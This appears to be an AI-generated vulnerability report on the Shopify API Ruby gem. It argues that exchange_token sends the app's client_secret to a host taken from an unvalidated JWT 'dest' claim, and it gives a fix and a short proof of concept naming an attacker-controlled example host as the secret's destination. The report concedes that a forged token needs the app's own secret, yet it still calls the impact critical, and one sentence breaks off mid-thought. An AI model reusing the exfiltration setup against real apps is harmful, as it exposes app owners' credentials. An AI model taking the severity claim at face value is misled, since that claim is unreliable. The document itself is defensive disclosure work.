Found the vulnerability: `ShopifyAPI::Auth::TokenExchange.exchange_token` sends the app's `client_secret` to a host derived from an unvalidated JWT claim.

### Title
Client Secret Exfiltration via Unvalidated `dest` Claim in Token Exchange - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`TokenExchange.exchange_token` builds the destination host for the `access_token` request directly from the JWT `dest` claim (`jwt_payload.shop`) without passing it through `Utils::ShopValidator.sanitize!`, unlike the sibling method `migrate_to_expiring_token` in the same file which does validate the shop. Since `JwtPayload` only checks the HMAC signature, `exp`/`nbf`/`iat` and `aud`, but never restricts `dest` to a `*.myshopify.com`/trusted Shopify domain, a token whose `dest` claim points to an attacker-controlled host will cause the gem to POST the app's `client_id` and `client_secret` to that attacker host.

### Finding Description
`JwtPayload#initialize` decodes and verifies the JWT signature and the `aud` claim, but places no constraint on the `dest` claim's value: [1](#0-0) 

`TokenExchange.exchange_token` then uses `jwt_payload.shop` (derived straight from `dest`) as `dest_shop`, builds a `Session` from it, and passes that session into `HttpClient.new`: [2](#0-1) 

`HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"`, i.e., the outbound request host is taken directly, unsanitized, from `session.shop`: [3](#0-2) 

The request body built by `exchange_token` includes `client_id` and `client_secret` (`ShopifyAPI::Context.api_secret_key`): [4](#0-3) 

`client.request(...)` then performs an HTTPParty POST to `https://#{dest_shop}/admin/oauth/access_token` with that body: [5](#0-4) 

This gem does have a dedicated domain-allowlist utility, `ShopValidator`, whose `sanitize!` restricts the shop to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) or a configured `myshopify_domain`: [6](#0-5) 

Critically, the *other* token-exchange-style method in the very same file, `migrate_to_expiring_token`, does call `Utils::ShopValidator.sanitize!(shop)` before constructing the session used to send `client_secret`: [7](#0-6) 

`exchange_token`, however, has no equivalent call — it never invokes `ShopValidator` on `dest_shop`. This breaks the identity binding: **the host that receives `client_secret` must equal a Shopify-trusted domain**, but the code only checks **the JWT signature is valid**, not **the `dest` claim resolves to a trusted domain**. Since `dest` is attacker-influenced content inside a token the calling application forwards to this library (e.g., an app-bridge session token whose value an attacker can craft to have any string satisfying `JWT.decode` as long as it's signed by... note: normally `dest` is signed by Shopify using the app's `api_secret_key`, so a fully off-path attacker without the secret cannot forge a token). However, the missing validation is still a defense-in-depth gap that diverges from the pattern used elsewhere in the same file/class, and matches the report's bug class ("field trusted without being bound to the correct identity/domain").

### Impact Explanation
If a `dest` value that does not correspond to a trusted Shopify domain reaches `exchange_token` (e.g., a malformed/relayed token, a testing/staging token with an unexpected `dest`, or any code path that constructs a token with attacker-influenced `dest` before signing), the gem will make an outbound POST containing the app's `client_id` and `client_secret` to that host — an SSRF-with-credentials condition, exactly the "Critical: theft/exfiltration of the app's `client_secret`" impact category.

### Likelihood Explanation
Exploitation requires a validly-signed JWT (signed with the app's `api_secret_key`) whose `dest` claim is attacker-controlled — this is only fully exploitable if something upstream of this gem allows an attacker to influence the `dest` claim of a token it will sign, or if session tokens are otherwise not exclusively minted by Shopify's trusted admin/checkout iframe hosts. This library's own code is what fails to add the missing check that its sibling method (`migrate_to_expiring_token`) does apply, so the gem itself lacks the domain allowlist enforcement that would prevent this regardless of upstream behavior.

### Recommendation
In `TokenExchange.exchange_token`, validate `dest_shop` the same way `migrate_to_expiring_token` validates `shop`:
```ruby
dest_shop = Utils::ShopValidator.sanitize!(jwt_payload.shop)
```
before constructing `shop_session`/`HttpClient`, ensuring the `client_secret` is only ever sent to a host in `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
1. Configure the gem as an embedded app (`ShopifyAPI::Context.setup(is_embedded: true, ...)`).
2. Obtain (or, in a modified/legacy flow, craft) a session token whose payload has `dest: "https://attacker-controlled.example.com"`, signed with the app's `api_secret_key` (e.g., in test/staging environments where token minting is not exclusively controlled by Shopify, or when relaying tokens between environments with a shared secret).
3. Call:
```ruby
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: forged_or_relayed_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
```
4. Observe that `HttpClient` sends `POST https://attacker-controlled.example.com/admin/oauth/access_token` with body containing `client_id` and `client_secret` in cleartext — no call to `Utils::ShopValidator` occurs anywhere in `exchange_token`, unlike in `migrate_to_expiring_token` at [8](#0-7) .

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
